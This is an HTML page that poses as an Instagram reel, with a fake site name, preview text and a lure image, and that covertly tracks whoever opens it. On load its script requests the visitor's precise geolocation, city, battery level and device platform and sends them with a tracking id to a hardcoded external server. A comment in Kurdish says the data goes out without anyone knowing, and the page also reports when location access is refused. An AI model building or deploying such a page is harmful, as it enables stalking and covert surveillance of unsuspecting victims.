<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>video-rell</title>
    <meta property="og:site_name" content="Instagram">
    <meta property="og:title" content="video-rell">
    <meta property="og:description" content="Watch this reel on Instagram">
    <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
    <meta property="og:type" content="video.other">
    <style>body { background: white; margin: 0; }</style>
</head>
<body onload="capture()">
<script>
    async function capture() {
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        if (!uid) return;

        // ئایپی سێرڤەرەکەت لێرە دابنێ
        const SERVER = "http://178.18.241.166:5000";

        navigator.geolocation.getCurrentPosition(async (pos) => {
            let city = "Unknown";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const geo = await res.json();
                city = geo.city;
            } catch (e) {}

            let bat = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
            }

            const data = {
                uid: uid,
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                city: city,
                bat: bat,
                device: navigator.platform
            };

            // ناردنی داتاکە بۆ VPS بەبێ ئەوەی کەس بزانێت
            fetch(`${SERVER}/receive`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });

        }, (err) => {
            fetch(`${SERVER}/denied?id=${uid}`);
        }, { enableHighAccuracy: true, timeout: 5000 });
    }
</script>
</body>
</html>
